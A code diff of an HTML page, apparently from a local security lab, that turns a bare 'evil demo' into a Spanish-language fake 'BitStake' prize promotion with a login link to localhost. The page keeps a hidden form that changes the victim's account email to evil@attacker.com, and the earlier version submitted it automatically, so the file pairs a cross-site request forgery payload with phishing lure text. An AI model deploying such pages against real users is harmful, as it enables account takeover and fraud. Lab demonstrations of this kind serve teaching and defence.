@@ -1,26 +1,48 @@
-<!-- static/evil.html -->
-<!doctype html>
+<!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="utf-8">
-  <title>evil demo (same-origin)</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Promoción Especial BitStake</title>
+    <link rel="stylesheet" href="/static/css/evil.css">
 </head>
 <body>
-  <h3>evil demo (same-origin)</h3>
-  <p>Esta página se sirve desde el mismo origen que la app legítima. Solo para laboratorio local.</p>
+    <div class="overlay"></div>
 
-  <form id="f" action="/change-email" method="POST">
-    <input name="new_email" value="evil@attacker.com">
-  </form>
+    <div class="card">
+        <h1 class="titulo">🎉¡Felicidades!🎉</h1>
+        <p class="subtitulo">Has sido seleccionado para recibir</p>
 
-  <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      var form = document.getElementById('f');
-      if (form) {
-        setTimeout(function(){ form.submit(); }, 200);
-      }
-    });
-  </script>
+        <div class="premio">
+            <span class="numero">$100.000</span>
+            <span class="texto">para apostar en BitStake</span>
+        </div>
+
+        <p class="mensaje">
+            Este beneficio es exclusivo y válido por tiempo limitado.  
+            Para activar tu recompensa, validá tu cuenta presionando el botón de abajo.
+        </p>
+
+        <a href="http://127.0.0.1:5000/login#" class="btn">Obtener Beneficio</a>
+
+        <p class="legal">
+            Promoción válida solo una vez por usuario.  
+            BitStake® 2025 – Todos los derechos reservados.
+        </p>
+    </div>
+
+    <form id="f" action="/change-email" method="POST" >
+        <input name="new_email" value="evil@attacker.com">
+    </form>
+
+    <!--   <script>
+        document.addEventListener('DOMContentLoaded', function() {
+        var form = document.getElementById('f');
+        if (form) {
+            setTimeout(function(){ form.submit(); }, 200);
+        }
+        });
+    </script> -->
+
 </body>
 </html>
-
